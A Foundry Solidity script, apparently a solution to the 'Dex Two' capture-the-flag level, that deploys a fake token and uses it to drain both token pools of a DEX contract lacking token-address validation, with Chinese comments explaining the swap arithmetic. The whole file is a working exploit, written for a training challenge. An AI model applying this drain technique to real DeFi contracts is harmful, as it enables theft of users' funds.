// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HigoToken} from "../src/HigoToken.sol";

interface IDexTwo {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
}

contract SolveDexTwo is Script {
    function run() external {
        // 從環境變數讀取你的 Instance 地址
        address dexTwoAddress = vm.envAddress("INSTANCE_ADDRESS");
        IDexTwo dex = IDexTwo(dexTwoAddress);
        
        uint256 deployerPrivateKey = vm.envUint("ETH_PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        // 1. 部署假幣
        HigoToken higo = new HigoToken();
        address higoAddr = address(higo);

        // 2. 授權 Dex 搬動我們的假幣
        higo.approve(dexTwoAddress, type(uint256).max);

        // 3. 轉 1 顆 Higo 給 Dex (建立 1:100 比例)
        // 注意：這裡直接轉 1 wei 即可，不需要 1 ether
        higo.transfer(dexTwoAddress, 1);
        console.log("Transferred 1 HIGO to DexTwo");

        // 4. 抽乾 Token1
        // 目前比例：Dex 有 100 T1, 1 Higo -> 公式: 1 * 100 / 1 = 100
        address t1 = dex.token1();
        dex.swap(higoAddr, t1, 1);
        console.log("Token1 balance in Dex:", dex.balanceOf(t1, dexTwoAddress));

        // 5. 抽乾 Token2
        // 目前比例：Dex 有 100 T2, 2 Higo (一開始給的 1 + 第一步交換進來的 1)
        // 公式：2 * 100 / 2 = 100
        address t2 = dex.token2();
        dex.swap(higoAddr, t2, 2);
        console.log("Token2 balance in Dex:", dex.balanceOf(t2, dexTwoAddress));

        vm.stopBroadcast();
        
        require(dex.balanceOf(t1, dexTwoAddress) == 0, "T1 not drained");
        require(dex.balanceOf(t2, dexTwoAddress) == 0, "T2 not drained");
        console.log("Level Solved!");
    }
}
